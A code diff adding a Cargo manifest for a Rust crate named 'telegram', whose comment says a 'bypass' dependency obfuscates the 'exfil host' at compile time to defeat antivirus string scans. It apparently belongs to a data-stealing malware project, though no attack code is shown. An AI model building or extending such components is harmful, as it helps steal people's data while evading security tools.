@@ -1,0 +1,12 @@
+[package]
+name = "telegram"
+version.workspace = true
+edition.workspace = true
+license.workspace = true
+
+[dependencies]
+abi = { path = "../abi" }
+# Compile-time string obfuscation for the exfil host (AV string scan).
+bypass = { path = "../bypass" }
+thiserror = { workspace = true }
+log = { workspace = true }
